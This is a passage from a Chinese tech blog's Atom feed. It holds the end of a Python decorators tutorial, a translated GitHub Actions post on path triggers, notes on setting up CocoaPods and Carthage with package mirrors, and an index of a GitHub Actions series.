class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">5</span></span><br><span class="line"></span><br><span class="line">result = add_5(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">End</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure><h3><span id="fan-hui-zhi">返回值</span></h3><p>请注意，在上面的示例中，我们没有取回结果，因此，下一步，我们还必须从内部函数返回值：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">start_end_decorator_3</span>(<span class="params">func</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;End&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@start_end_decorator_3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_5</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">5</span></span><br><span class="line"></span><br><span class="line">result = add_5(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">End</span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure><h3><span id="han-shu-biao-shi-you-ru-he-bian-hua-ni">函数标识又如何变化呢？</span></h3><p>如果我们看一下装饰函数的名称，并使用内置的 <code>help</code> 函数对其进行检查，我们会注意到Python认为我们的函数现在是装饰器函数的包装内部函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(add_5.__name__)</span><br><span class="line"><span class="built_in">help</span>(add_5)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wrapper</span><br><span class="line">Help on function wrapper <span class="keyword">in</span> module __main__:</span><br><span class="line"></span><br><span class="line">wrapper(*args, **kwargs)</span><br></pre></td></tr></table></figure><p>要解决此问题，请使用 <code>functools.wraps</code> 装饰器，该装饰器将保留有关原始函数的信息。 这有助于进行自省，即对象在运行时了解其自身属性的能力：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_end_decorator_4</span>(<span class="params">func</span>):</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;End&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@start_end_decorator_4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_5</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">5</span></span><br><span class="line">result = add_5(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(add_5.__name__)</span><br><span class="line"><span class="built_in">help</span>(add_5)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">End</span><br><span class="line"><span class="number">15</span></span><br><span class="line">add_5</span><br><span class="line">Help on function add_5 <span class="keyword">in</span> module __main__:</span><br><span class="line"></span><br><span class="line">add_5(x)</span><br></pre></td></tr></table></figure><h3><span id="zhuang-shi-qi-de-zui-zhong-mo-ban">装饰器的最终模板</span></h3><p>现在，我们已经有了所有部分，用于任何装饰器的模板如下所示：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_decorator</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="comment"># Do something before</span></span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="comment"># Do something after</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><h3><span id="zhuang-shi-qi-han-shu-can-shu">装饰器函数参数</span></h3><p>请注意， <code>functools.wraps</code> 是一个装饰器，它自己接受一个参数。 我们可以将其视为2个内部函数，即内部函数里的内部函数。 为了更清楚地说明这一点，我们来看另一个示例：以数字作为输入的 <code>repeat</code> 装饰器。 在此函数内，我们有实际的装饰函数，该函数包装函数并在另一个内部函数内扩展其行为。 在这种情况下，它将输入函数重复给定的次数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">repeat</span>(<span class="params">num_times</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator_repeat</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">        @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_times):</span><br><span class="line">                result = func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator_repeat</span><br><span class="line"></span><br><span class="line"><span class="meta">@repeat(<span class="params">num_times=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">greet(<span class="string">&#x27;Alex&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello Alex</span><br><span class="line">Hello Alex</span><br><span class="line">Hello Alex</span><br></pre></td></tr></table></figure><h3><span id="qian-tao-zhuang-shi-qi">嵌套装饰器</span></h3><p>我们可以通过将多个装饰器彼此堆叠来将其应用到一个函数。 装饰器将按照其列出的顺序执行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 装饰器函数，它输出有关包装函数的调试信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        args_repr = [<span class="built_in">repr</span>(a) <span class="keyword">for</span> a <span class="keyword">in</span> args]</span><br><span class="line">        kwargs_repr = [<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;v!r&#125;</span>&quot;</span> <span class="keyword">for</span> k, v <span class="keyword">in</span> kwargs.items()]</span><br><span class="line">        signature = <span class="string">&quot;, &quot;</span>.join(args_repr + kwargs_repr)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Calling <span class="subst">&#123;func.__name__&#125;</span>(<span class="subst">&#123;signature&#125;</span>)&quot;</span>)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;func.__name__!r&#125;</span> returned <span class="subst">&#123;result!r&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@debug</span></span><br><span class="line"><span class="meta">@start_end_decorator_4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">name</span>):</span><br><span class="line">    greeting = <span class="string">f&#x27;Hello <span class="subst">&#123;name&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(greeting)</span><br><span class="line">    <span class="keyword">return</span> greeting</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在 `debug` 先执行，然后调用 `@start_end_decorator_4`，后者优惠调用 `say_hello`</span></span><br><span class="line">say_hello(name=<span class="string">&#x27;Alex&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Calling say_hello(name=<span class="string">&#x27;Alex&#x27;</span>)</span><br><span class="line">Start</span><br><span class="line">Hello Alex</span><br><span class="line">End</span><br><span class="line"><span class="string">&#x27;say_hello&#x27;</span> returned <span class="string">&#x27;Hello Alex&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="lei-zhuang-shi-qi">类装饰器</span></h3><p>我们也可以使用一个类作为装饰器。 因此，我们必须实现 <code>__call__()</code> 方法以使我们的对象可调用。 类装饰器通常用于维护状态，例如： 在这里，我们跟踪函数执行的次数。 <code>__call__</code>方法与我们之前看到的 <code>wrapper()</code> 方法本质上是相同的。 它添加了一些功能，执行了该函数，并返回其结果。 请注意，这里我们使用 <code>functools.update_wrapper()</code> 代替 <code>functools.wraps</code> 来保留有关函数的信息。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CountCalls</span>:</span><br><span class="line">    <span class="comment"># 初始化需要以func作为参数并将其存储</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func</span>):</span><br><span class="line">        functools.update_wrapper(self, func)</span><br><span class="line">        self.func = func</span><br><span class="line">        self.num_calls = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 扩展功能，执行函数并返回结果</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        self.num_calls += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Call <span class="subst">&#123;self.num_calls&#125;</span> of <span class="subst">&#123;self.func.__name__!r&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="meta">@CountCalls</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">say_hello(<span class="number">5</span>)</span><br><span class="line">say_hello(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Call <span class="number">1</span> of <span class="string">&#x27;say_hello&#x27;</span></span><br><span class="line">Hello!</span><br><span class="line">Call <span class="number">2</span> of <span class="string">&#x27;say_hello&#x27;</span></span><br><span class="line">Hello!</span><br></pre></td></tr></table></figure><h3><span id="yi-xie-dian-xing-de-yong-li">一些典型的用例</span></h3><ul><li>使用计时器装饰器来计算函数的执行时间</li><li>使用调试装饰器来打印出有关被调用函数及其参数的更多信息</li><li>使用检查修饰符检查参数是否满足某些要求并相应地调整行为</li><li>注册函数（插件）</li><li>使用 <code>time.sleep()</code> 降低代码速度以检查网络行为</li><li>缓存返回值以进行记忆化（<a href="https://en.wikipedia.org/wiki/Memoization%EF%BC%89">https://en.wikipedia.org/wiki/Memoization）</a></li><li>添加信息或更新状态</li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      13. 装饰器 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第10天：路径触发器</title>
    <link href="https://qiwihui.com/qiwihui-blog-93/"/>
    <id>https://qiwihui.com/qiwihui-blog-93/</id>
    <published>2022-08-13T01:54:25.680Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>前面我们看到可以限制<a href="https://qiwihui.com/qiwihui-blog-84/">基于分支过滤器的</a>工作流运行。对于由 <code>push</code> 或 <code>pull_request</code> 触发的工作流，你可以对其进行限制，以使其仅在推送到特定分支或针对特定分支打开 pull request 时才触发。</p><p>你还可以限制这些工作流，以便仅在<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#onpushpull_requestpaths">推送特定路径</a>时才触发它们。</p><span id="more"></span><p>如果你在提交某些东西时会运行一些自动化功能，这将非常有用。例如：在我的一个开源项目中，每次将提交合并到master分支中时，我们都会将文档发布到我们的网站上。但是，我们只想在文档实际更改时运行该工作流程。</p><p>在这种情况下，我们希望docs在master分支中目录中的任何内容更改时运行。我们可以使用<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet">通配符</a>作为路径过滤器的一部分：</p><script src="https://gist.github.com/ethomson/5244d867cb44c3d855f05094562d6dc2.js"></script><p>现在，我们有了一个工作流程，只要我们对文件docs夹中的文件进行新更改并将其合并到master分支中，就可以运行脚本 <code>publish_docs.sh</code>。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_10_path_triggers.html">https://www.edwardthomson.com/blog/github_actions_10_path_triggers.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第10天：路径触发器
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>Cocoapods 和 Carthage 使用笔记</title>
    <link href="https://qiwihui.com/qiwihui-blog-44/"/>
    <id>https://qiwihui.com/qiwihui-blog-44/</id>
    <published>2022-08-13T01:54:25.660Z</published>
    <updated>2024-05-15T02:25:31.473Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="carthage-he-coaoapods-de-qu-bie">Carthage 和 CoaoaPods 的区别</span></h2><p><code>CoaoaPods</code> 是一套整体解决方案，我们在 <code>Podfile</code> 中指定好我们需要的第三方库。然后 <code>CocoaPods</code> 就会进行下载，集成，然后修改或者创建我们项目的 <code>workspace</code> 文件，这一系列整体操作。</p><p>相比之下，<code>Carthage</code> 就要轻量很多，它也会一个叫做 <code>Cartfile</code> 描述文件，但 <code>Carthage</code> 不会对我们的项目结构进行任何修改，更不多创建 <code>workspace</code>。它只是根据我们描述文件中配置的第三方库，将他们下载到本地，然后使用 <code>xcodebuild</code> 构建成 <code>framework</code> 文件。然后由我们自己将这些库集成到项目中。<code>Carthage</code> 使用的是一种<strong>非侵入性</strong>的哲学。</p><p>另外 <code>Carthage</code> 除了非侵入性，它还是去中心化的，它的包管理不像 <code>CocoaPods</code> 那样，有一个中心服务器(<a href="http://cocoapods.org">cocoapods.org</a>)，来管理各个包的元信息，而是依赖于每个第三方库自己的源地址，比如 Github。</p><span id="more"></span><h2><span id="cocoapods">Cocoapods</span></h2><h3><span id="an-zhuang">安装</span></h3><ol><li><p>（可选）使用 <del>taobao</del> ruby-china 源替换默认 gem 源: <code>gem source blabla..</code></p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gem sources -l</span><br><span class="line">*** CURRENT SOURCES ***</span><br><span class="line"></span><br><span class="line">https://rubygems.org/</span><br><span class="line"></span><br><span class="line">$ gem sources --remove https://rubygems.org/</span><br><span class="line">https://ruby.taobao.org/ removed from sources</span><br><span class="line"></span><br><span class="line">$ gem <span class="built_in">source</span> -a https://gems.ruby-china.com/</span><br><span class="line">https://gems.ruby-china.com/ added to sources</span><br><span class="line"></span><br><span class="line">$ gem <span class="built_in">source</span> -c</span><br><span class="line">*** Removed specs cache ***</span><br><span class="line"></span><br><span class="line">$ gem <span class="built_in">source</span> -u</span><br><span class="line"><span class="built_in">source</span> cache successfully updated</span><br><span class="line"></span><br><span class="line">$ gem sources -l</span><br><span class="line">*** CURRENT SOURCES ***</span><br><span class="line"></span><br><span class="line">https://gems.ruby-china.com/</span><br></pre></td></tr></table></figure></li><li><p><code>sudo gem install cocoapods</code></p></li><li><p>（可选）切换 pod 源</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pod repo</span><br><span class="line"></span><br><span class="line">master</span><br><span class="line">- Type: git (master)</span><br><span class="line">- URL:  https://github.com/CocoaPods/Specs.git</span><br><span class="line">- Path: /Users/qiwihui/.cocoapods/repos/master</span><br><span class="line"></span><br><span class="line">$ pod repo remove master</span><br><span class="line"></span><br><span class="line">$ pod repo add master https://git.coding.net/CocoaPods/Specs.git</span><br><span class="line"></span><br><span class="line">$ pod repo update</span><br><span class="line"></span><br><span class="line">$ pod setup</span><br></pre></td></tr></table></figure><p>或者</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://git.coding.net/CocoaPods/Specs.git ~/.cocoapods/repos/master</span><br><span class="line">$ pod repo update</span><br></pre></td></tr></table></figure><p>切换回官方镜像</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pod repo remove master</span><br><span class="line"></span><br><span class="line">$ pod repo add master https://github.com/CocoaPods/Specs.git</span><br><span class="line"></span><br><span class="line">$ pod repo update</span><br><span class="line">Updating spec repo `master`</span><br><span class="line">  $ /usr/local/bin/git -C /Users/qiwihui/.cocoapods/repos/master fetch origin --progress</span><br><span class="line">  remote: Enumerating objects: 511, <span class="keyword">done</span>.        </span><br><span class="line">  remote: Counting objects: 100% (511/511), <span class="keyword">done</span>.        </span><br><span class="line">  remote: Compressing objects: 100% (134/134), <span class="keyword">done</span>.        </span><br><span class="line">  remote: Total 820 (delta 399), reused 449 (delta 367), pack-reused 309        </span><br><span class="line">  Receiving objects: 100% (820/820), 99.24 KiB | 401.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">  Resolving deltas: 100% (501/501), completed with 194 <span class="built_in">local</span> objects.</span><br><span class="line">  From https://github.com/CocoaPods/Specs</span><br><span class="line">     5b04790953c..e3ba7ee3a29  master     -&gt; origin/master</span><br><span class="line">  $ /usr/local/bin/git -C /Users/qiwihui/.cocoapods/repos/master rev-parse --abbrev-ref HEAD</span><br><span class="line">  master</span><br><span class="line">  $ /usr/local/bin/git -C /Users/qiwihui/.cocoapods/repos/master reset --hard origin/master</span><br><span class="line">  HEAD is now at e3ba7ee3a29 [Add] IOS_OC_BASIC 6.3</span><br><span class="line"></span><br><span class="line">CocoaPods 1.6.0.beta.2 is available.</span><br><span class="line">To update use: `sudo gem install cocoapods --pre`</span><br><span class="line">[!] This is a <span class="built_in">test</span> version we<span class="string">&#x27;d love you to try.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For more information, see https://blog.cocoapods.org and the CHANGELOG for this version at https://github.com/CocoaPods/CocoaPods/releases/tag/1.6.0.beta.2</span></span><br></pre></td></tr></table></figure></li><li><p>如果Podfile文件中有</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source &#x27;https://github.com/CocoaPods/Specs.git&#x27;</span><br></pre></td></tr></table></figure><p>也需要把它换成repo的源，否则依然是使用GitHub源</p></li></ol><h3><span id="ji-chu-yong-fa">基础用法</span></h3><ol start="0"><li><p><code>cd &lt;project_folder&gt;</code></p></li><li><p><code>pod init</code></p></li><li><p>编辑 Podfile, example</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 平台，必需</span><br><span class="line">platform :ios, &#x27;9.0&#x27;</span><br><span class="line"># 隐藏警告</span><br><span class="line">inhibit_all_warnings!</span><br><span class="line"></span><br><span class="line">target &#x27;AlamofireDemo&#x27; do</span><br><span class="line">    # Using Swift and want to use dynamic frameworks</span><br><span class="line">    use_frameworks!</span><br><span class="line"></span><br><span class="line">    # 项目 Pods</span><br><span class="line">    pod &#x27;Alamofire&#x27;, &#x27;~&gt; 4.5&#x27;</span><br><span class="line"></span><br><span class="line">    target &#x27;AlamofireDemoTests&#x27; do</span><br><span class="line">        inherit! :search_paths</span><br><span class="line">        # 测试 Pods</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>版本支持：- <code>&gt;</code>, <code>&gt;=</code>, <code>&lt;</code>, <code>&lt;=</code>- <code>~&gt;</code>: <strong>up to</strong> next major | minor | patch- <code>:path</code> 本地绝对路径- <code>:git</code> git项目地址，还可使用 <code>:branch</code>, <code>:tag</code>, <code>:commit</code></p></li><li><p><code>pod install</code></p></li><li><p><strong>Always</strong> 打开项目下 *.xcworkspace 文件作为项目入口</p></li></ol><h3><span id="pod-install-he-pod-update-qu-bie">pod install 和 pod update 区别</span></h3><ul><li><code>pod install [package_name]</code>: 安装特定版本的 pods</li><li><code>pod update [package_name]</code>: 升级 pods 到最新版本</li></ul><h2><span id="carthage">Carthage</span></h2><h3><span id="an-zhuang">安装</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install carthage</span><br></pre></td></tr></table></figure><h3><span id="shi-yong">使用</span></h3><ol><li><p>编辑 <code>Cartfile</code>，比如 <code>SwiftyJSON</code></p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">github <span class="string">&quot;SwiftyJSON/SwiftyJSON&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>carthage update [–platform ios]</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ carthage update</span><br><span class="line">*** Fetching SwiftyJSON</span><br><span class="line">*** Checking out SwiftyJSON at <span class="string">&quot;4.2.0&quot;</span></span><br><span class="line">*** xcodebuild output can be found <span class="keyword">in</span> /var/folders/kl/g94q0k_571vdjtcwzzcv20s40000gn/T/carthage-xcodebuild.nN22hg.<span class="built_in">log</span></span><br><span class="line">*** Building scheme <span class="string">&quot;SwiftyJSON iOS&quot;</span> <span class="keyword">in</span> SwiftyJSON.xcworkspace</span><br><span class="line">*** Building scheme <span class="string">&quot;SwiftyJSON watchOS&quot;</span> <span class="keyword">in</span> SwiftyJSON.xcworkspace</span><br><span class="line">*** Building scheme <span class="string">&quot;SwiftyJSON tvOS&quot;</span> <span class="keyword">in</span> SwiftyJSON.xcworkspace</span><br><span class="line">*** Building scheme <span class="string">&quot;SwiftyJSON macOS&quot;</span> <span class="keyword">in</span> SwiftyJSON.xcworkspace</span><br></pre></td></tr></table></figure></li><li><p><code>Carthage</code> 目录下：</p><ul><li>Build(编译出来的.framework二进制代码库)</li><li>Checkouts(源码)</li></ul> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree -L 3 Carthage/</span><br><span class="line">Carthage/</span><br><span class="line">├── Build</span><br><span class="line">│   ├── Mac</span><br><span class="line">│   │   ├── SwiftyJSON.framework</span><br><span class="line">│   │   └── SwiftyJSON.framework.dSYM</span><br><span class="line">│   ├── iOS</span><br><span class="line">│   │   ├── 22BD4B6C-0B26-35E1-AF5F-8FB6AEBFD2FD.bcsymbolmap</span><br><span class="line">│   │   ├── C862E8A1-24ED-398A-A8E9-A7384E34EDB1.bcsymbolmap</span><br><span class="line">│   │   ├── SwiftyJSON.framework</span><br><span class="line">│   │   └── SwiftyJSON.framework.dSYM</span><br><span class="line">│   ├── tvOS</span><br><span class="line">│   │   ├── 1ADB9C1F-36CA-3386-BF07-6EE29B5F8081.bcsymbolmap</span><br><span class="line">│   │   ├── SwiftyJSON.framework</span><br><span class="line">│   │   └── SwiftyJSON.framework.dSYM</span><br><span class="line">│   └── watchOS</span><br><span class="line">│       ├── A8A151AB-D15E-3A0B-8A17-BF1A39EC6AB4.bcsymbolmap</span><br><span class="line">│       ├── EA427A42-6D21-3FF4-919F-5E50BF8A5D7B.bcsymbolmap</span><br><span class="line">│       ├── SwiftyJSON.framework</span><br><span class="line">│       └── SwiftyJSON.framework.dSYM</span><br><span class="line">└── Checkouts</span><br><span class="line">    └── SwiftyJSON</span><br><span class="line">        ├── CHANGELOG.md</span><br><span class="line">        ├── Example</span><br><span class="line">        ├── LICENSE</span><br><span class="line">        ├── Package.swift</span><br><span class="line">        ├── README.md</span><br><span class="line">        ├── Source</span><br><span class="line">        ├── SwiftyJSON.podspec</span><br><span class="line">        ├── SwiftyJSON.xcodeproj</span><br><span class="line">        ├── SwiftyJSON.xcworkspace</span><br><span class="line">        ├── Tests</span><br><span class="line">        └── scripts</span><br></pre></td></tr></table></figure></li><li><p>添加生成的文件： 项目 “General” -&gt; “Linked Frameworks and Libraries” -&gt; 将 <code>Carthage/Build/iOS</code> 中的 <code>.framework</code> 文件添加到项目中</p></li><li><p>“Build Phases” -&gt; “+” -&gt; “New Run Script Phase”</p><ul><li>/bin/sh</li><li>/usr/local/bin/carthage copy-frameworks</li><li>“Input Files”: $(SRCROOT)/Carthage/Build/iOS/SwiftyJSON.framework</li><li>“Output Files”: $(BUILT_PRODUCTS_DIR)/$(FRAMEWORKS_FOLDER_PATH)/SwiftyJSON.framework</li></ul><p>添加这个 Run Script 的作用是为了让运行时能够找到这个动态库。还可以将 Carthage 所集成的第三方库生成的符号文件添加到项目中，这样我们在调试的时候，就可以步入第三方库内部的代码：<code>Build Phrases</code> -&gt; <code>New Copy Files Phrase</code>，将 Carthage/Build/iOS 目录中的 <code>SwiftyJSON.framework.dSYM</code> 符号文件拖动进来</p></li></ol><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://www.jianshu.com/p/f024ca2267e3">解决Cocoapods贼慢问题</a></li><li><a href="http://swiftcafe.io/2015/10/25/swift-daily-carthage-package">Carthage 包管理工具，另一种敏捷轻快的 iOS &amp; MAC 开发体验</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Cocoapods 和 Carthage 使用笔记
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="iOS" scheme="https://qiwihui.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions Advent Calendar 系列文章 - Index</title>
    <link href="https://qiwihui.com/qiwihui-blog-83/"/>
    <id>https://qiwihui.com/qiwihui-blog-83/</id>
    <published>2022-08-13T01:54:25.660Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>最近我在做项目 <a href="https://codedays.app">codedays.app</a> 过程中，发现 Github 推出的 Github Actions 可以很方便地用来做CI/CD之类的工作，所以决定将 <a href="https://www.edwardthomson.com/blog/github_actions_advent_calendar.html">GitHub Actions Advent Calendar</a> 这个系列的文章做个简单的翻译和整理。这篇文章是所有文章的索引。</p><p>每天一个tips：</p><ul><li>[x] 第1天: CI/CD Triggers</li><li>[x] 第2天: Matrix Workflows</li><li>[x] 第3天: Cross-Platform Builds</li><li>[ ] 第4天: Installing Tools</li><li>[ ] 第5天: Building in Containers</li><li>[ ] 第6天: Fail-Fast Matrix Workflows</li><li>[ ] 第7天: Starter Workflows</li><li>[ ] 第8天: Dealing with Stale Issues</li><li>[ ] 第9天: Deploy to GitHub Packages</li><li>[ ] 第10天: Path Triggers</li><li>[ ] 第11天: Secrets</li><li>[ ] 第12天: Information about your Workflow</li><li>[ ] 第13天: Conditionals</li><li>[ ] 第14天: Conditionals with a Matrix</li><li>[ ] 第15天: Sharing Data Between Steps</li><li>[ ] 第16天: Conditionals with Shared Data</li><li>[ ] 第17天: Dependent Jobs</li><li>[ ] 第18天: Artifacts</li><li>[ ] 第19天: Downloading Artifacts</li><li>[ ] 第20天: Container Services</li><li>[ ] 第21天: GitHub Script</li><li>[ ] 第22天: Automerge Security Updates</li><li>[ ] 第23天: Upload Release Builds</li><li>[ ] 第24天: Caching Dependencies</li><li>[ ] 第25天: Sparkle a Christmas Tree</li><li>[ ] 第26天: Self-Hosted Runners</li><li>[ ] 第27天: Deploy to Cloud</li><li>[ ] 第28天: Repository Automation</li><li>[ ] 第29天: Creating an Action</li><li>[ ] 第30天: Integrating Other APIs in an Action</li><li>[ ] 第31天: Adding an Action to the Marketplace</li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a 